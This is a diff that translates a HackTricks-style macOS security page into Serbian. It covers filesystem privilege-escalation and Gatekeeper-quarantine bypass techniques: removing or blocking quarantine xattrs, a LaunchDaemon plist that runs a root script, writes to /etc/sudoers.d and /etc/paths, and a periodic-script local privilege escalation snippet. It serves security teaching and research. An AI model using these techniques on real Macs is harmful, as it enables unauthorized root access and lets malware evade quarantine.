@@ -2,74 +2,69 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## POSIX permissions combinations
+## POSIX kombinacije dozvola
 
-Permissions in a **directory**:
+Dozvole u **direktorijumu**:
 
-- **read** - you can **enumerate** the directory entries
-- **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.
-  - But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
-  - You **cannot modify the name of a folder** unless you own it.
-- **execute** - you are **allowed to traverse** the directory - if you don’t have this right, you can’t access any files inside it, or in any subdirectories.
+- **čitanje** - možete **nabrojati** unose u direktorijumu
+- **pisanje** - možete **brisati/pisati** **fajlove** u direktorijumu i možete **brisati prazne foldere**.
+- Ali ne možete **brisati/modifikovati neprazne foldere** osim ako nemate dozvolu za pisanje nad njima.
+- Ne možete **modifikovati ime foldera** osim ako ga ne posedujete.
+- **izvršavanje** - **dozvoljeno vam je da prolazite** kroz direktorijum - ako nemate ovo pravo, ne možete pristupiti nijednom fajlu unutar njega, niti u bilo kojim poddirektorijumima.
 
-### Dangerous Combinations
+### Opasne kombinacije
 
-**How to overwrite a file/folder owned by root**, but:
+**Kako prepisati fajl/folder koji poseduje root**, ali:
 
-- One parent **directory owner** in the path is the user
-- One parent **directory owner** in the path is a **users group** with **write access**
-- A users **group** has **write** access to the **file**
+- Jedan roditeljski **vlasnik direktorijuma** u putanji je korisnik
+- Jedan roditeljski **vlasnik direktorijuma** u putanji je **grupa korisnika** sa **pristupom za pisanje**
+- Grupa korisnika ima **pristup za pisanje** na **fajl**
 
-With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.
+Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** **sim/link** na očekivanu putanju da bi dobio privilegovano proizvoljno pisanje.
 
-### Folder root R+X Special case
+### Folder root R+X Poseban slučaj
 
-If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.
+Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, ti fajlovi su **nedostupni bilo kome drugom**. Tako da ranjivost koja omogućava **premestiti fajl koji je čitljiv za korisnika**, a koji ne može biti pročitan zbog te **restrikcije**, iz ovog foldera **u drugi**, može se zloupotrebiti da bi se pročitali ti fajlovi.
 
-Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
+Primer u: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
-## Symbolic Link / Hard Link
+## Simbolički link / Hard link
 
-If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.
+Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa nižim privilegijama**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa nižim privilegijama. Korisnik bi mogao samo **usmeriti na drugi fajl** putem simboličkog ili hard linka, i privilegovani proces će pisati na taj fajl.
 
-Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.
+Proverite u drugim sekcijama gde bi napadač mogao **zloupotrebiti proizvoljno pisanje da bi eskalirao privilegije**.
 
 ## .fileloc
 
-Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
-Example:
-
+Fajlovi sa **`.fileloc`** ekstenzijom mogu ukazivati na druge aplikacije ili binarne fajlove, tako da kada se otvore, aplikacija/binarni fajl će biti onaj koji se izvršava.\
+Primer:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>URL</key>
-    <string>file:///System/Applications/Calculator.app</string>
-    <key>URLPrefix</key>
-    <integer>0</integer>
+<key>URL</key>
+<string>file:///System/Applications/Calculator.app</string>
+<key>URLPrefix</key>
+<integer>0</integer>
 </dict>
 </plist>
 ```
+## Arbitrarni FD
 
-## Arbitrary FD
+Ako možete da **naterate proces da otvori datoteku ili folder sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvorite datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da `exploit.py` dobije FD do datoteke unutar `/etc/sudoers` i zloupotrebi je.
 
-If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
+Na primer: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
+## Izbegavajte trikove sa xattrs karantinom
 
-## Avoid quarantine xattrs tricks
-
-### Remove it
-
+### Uklonite to
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-
 ### uchg / uchange / uimmutable flag
 
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
-
+Ako datoteka/folder ima ovu nepromenljivu atribut, neće biti moguće postaviti xattr na nju.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -79,11 +74,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-
 ### defvfs mount
 
-A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
-
+**devfs** mount **ne podržava xattr**, više informacija u [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -92,11 +85,9 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
-
+Ova ACL sprečava dodavanje `xattrs` na datoteku
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -117,17 +108,15 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** file format copies a file including its ACEs.
+**AppleDouble** format datoteka kopira datoteku uključujući njene ACE.
 
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će ACL tekstualna reprezentacija smeštena unutar xattr pod nazivom **`com.apple.acl.text`** biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste kompresovali aplikaciju u zip datoteku sa **AppleDouble** formatom datoteke sa ACL-om koji sprečava da se drugi xattrs upisuju u nju... xattr za karantin nije postavljen u aplikaciju:
 
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+Proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.
 
-To replicate this we first need to get the correct acl string:
-
+Da bismo ovo replicirali, prvo moramo dobiti ispravan acl string:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -145,7 +134,6 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-
 (Note that even if this works the sandbox write the quarantine xattr before)
 
 Not really needed but I leave it there just in case:
@@ -156,64 +144,59 @@ macos-xattr-acls-extra-stuff.md
 
 ## Bypass Code Signatures
 
-Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
+Paketi sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **paketu**. Imajte na umu da je hash CodeResources takođe **ugrađen u izvršnu datoteku**, tako da ne možemo ni s tim da se igramo.
 
-However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
-
+Međutim, postoje neke datoteke čija se potpisivanje neće proveravati, ove imaju ključ omit u plist-u, kao:
 ```xml
 <dict>
 ...
-	<key>rules</key>
-	<dict>
+<key>rules</key>
+<dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
-	</dict>
-	<key>rules2</key>
+</dict>
+<key>rules2</key>
 ...
-		<key>^(.*/)?\.DS_Store$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>2000</real>
-		</dict>
+<key>^(.*/)?\.DS_Store$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>2000</real>
+</dict>
 ...
-		<key>^PkgInfo$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>20</real>
-		</dict>
+<key>^PkgInfo$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>20</real>
+</dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
 </dict>
 ```
-
-It's possible to calculate the signature of a resource from the cli with:
-
+Moguće je izračunati potpis resursa iz CLI-a sa:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-
 ## Mount dmgs
 
-A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
-
+Korisnik može montirati prilagođeni dmg kreiran čak i na postojećim folderima. Ovako možete kreirati prilagođeni dmg paket sa prilagođenim sadržajem:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -234,55 +217,51 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
+Obično macOS montira disk komunicirajući sa `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisom (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako dodate parametar `-d` u LaunchDaemons plist datoteku i ponovo pokrenete, čuvaće logove u `/var/log/diskarbitrationd.log`.\
+Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.
 
-Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
-However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
+## Arbitrarne pisanja
 
-## Arbitrary Writes
+### Periodični sh skripti
 
-### Periodic sh scripts
+Ako vaša skripta može biti interpretirana kao **shell skripta**, mogli biste prepisati **`/etc/periodic/daily/999.local`** shell skriptu koja će se pokretati svaki dan.
 
-If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.
+Možete **fingirati** izvršenje ove skripte sa: **`sudo periodic daily`**
 
-You can **fake** an execution of this script with: **`sudo periodic daily`**
+### Daemoni
 
-### Daemons
-
-Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
-
+Napišite arbitrarnu **LaunchDaemon** kao **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist-om koji izvršava arbitrarnu skriptu kao:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.sample.Load</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>/Applications/Scripts/privesc.sh</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-    </dict>
+<dict>
+<key>Label</key>
+<string>com.sample.Load</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Scripts/privesc.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
 </plist>
 ```
+Samo generiši skriptu `/Applications/Scripts/privesc.sh` sa **komandama** koje želiš da izvršiš kao root.
 
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+### Sudoers Fajl
 
-### Sudoers File
+Ako imaš **arbitrarno pisanje**, možeš kreirati fajl unutar foldera **`/etc/sudoers.d/`** dodeljujući sebi **sudo** privilegije.
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+### PATH fajlovi
 
-### PATH files
+Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env varijablu. Moraš biti root da bi ga prepisao, ali ako skripta iz **privilegovanog procesa** izvršava neku **komandu bez punog puta**, možda ćeš moći da je **preuzmeš** modifikovanjem ovog fajla.
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+Takođe možeš pisati fajlove u **`/etc/paths.d`** da učitaš nove foldere u `PATH` env varijablu.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+## Generiši pisljive fajlove kao drugi korisnici
 
-## Generate writable files as other users
-
-This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). This might also work as privesc:
-
+Ovo će generisati fajl koji pripada root-u, a koji je pisiv od strane mene ([**kod odavde**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Ovo takođe može raditi kao privesc:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -294,15 +273,13 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
+## POSIX Deljena Memorija
 
-## POSIX Shared Memory
-
-**POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.
+**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkom memorijskom prostoru, olakšavajući bržu komunikaciju u poređenju sa drugim metodama međuprocesne komunikacije. To uključuje kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()`, i mapiranje u adresni prostor procesa koristeći `mmap()`. Procesi zatim mogu direktno čitati iz i pisati u ovaj memorijski prostor. Da bi se upravljalo konkurentnim pristupom i sprečila korupcija podataka, mehanizmi sinhronizacije kao što su mutexi ili semafori se često koriste. Na kraju, procesi demapiraju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, i opcionalno uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je posebno efikasan za brzu IPC u okruženjima gde više procesa treba brzo da pristupi deljenim podacima.
 
 <details>
 
-<summary>Producer Code Example</summary>
-
+<summary>Primer Koda Proizvođača</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -313,46 +290,44 @@ echo $FILENAME
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Create the shared memory object
-    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Create the shared memory object
+int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Configure the size of the shared memory object
-    if (ftruncate(shm_fd, SIZE) == -1) {
-        perror("ftruncate");
-        return EXIT_FAILURE;
-    }
+// Configure the size of the shared memory object
+if (ftruncate(shm_fd, SIZE) == -1) {
+perror("ftruncate");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Write to the shared memory
-    sprintf(ptr, "Hello from Producer!");
+// Write to the shared memory
+sprintf(ptr, "Hello from Producer!");
 
-    // Unmap and close, but do not unlink
-    munmap(ptr, SIZE);
-    close(shm_fd);
+// Unmap and close, but do not unlink
+munmap(ptr, SIZE);
+close(shm_fd);
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
 
 <details>
 
-<summary>Consumer Code Example</summary>
-
+<summary>Primer potrošačkog koda</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -363,51 +338,49 @@ int main() {
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Open the shared memory object
-    int shm_fd = shm_open(name, O_RDONLY, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Open the shared memory object
+int shm_fd = shm_open(name, O_RDONLY, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Read from the shared memory
-    printf("Consumer received: %s\n", (char *)ptr);
+// Read from the shared memory
+printf("Consumer received: %s\n", (char *)ptr);
 
-    // Cleanup
-    munmap(ptr, SIZE);
-    close(shm_fd);
-    shm_unlink(name); // Optionally unlink
+// Cleanup
+munmap(ptr, SIZE);
+close(shm_fd);
+shm_unlink(name); // Optionally unlink
 
-    return 0;
+return 0;
 }
 
 ```
-
 </details>
 
-## macOS Guarded Descriptors
+## macOS Zaštićeni Deskriptor
 
-**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.
+**macOS zaštićeni deskriptor** je bezbednosna funkcija uvedena u macOS kako bi se poboljšala sigurnost i pouzdanost **operacija sa deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptor pružaju način za povezivanje specifičnih ograničenja ili "čuvara" sa deskriptorima datoteka, koja se sprovode od strane jezgra.
 
-This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:
+Ova funkcija je posebno korisna za sprečavanje određenih klasa bezbednosnih ranjivosti kao što su **neovlašćen pristup datotekama** ili **trkačke uslove**. Ove ranjivosti se javljaju kada, na primer, jedan nit pristupa opisu datoteke dajući **drugom ranjivom niti pristup** ili kada deskriptor datoteke bude **nasleđen** od ranjivog procesa. Neke funkcije povezane sa ovom funkcionalnošću su:
 
-- `guarded_open_np`: Opend a FD with a guard
-- `guarded_close_np`: Close it
-- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)
+- `guarded_open_np`: Otvara FD sa čuvarom
+- `guarded_close_np`: Zatvara ga
+- `change_fdguard_np`: Menja zastavice čuvara na deskriptoru (čak i uklanjajući zaštitu čuvara)
 
-## References
+## Reference
 
 - [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
-
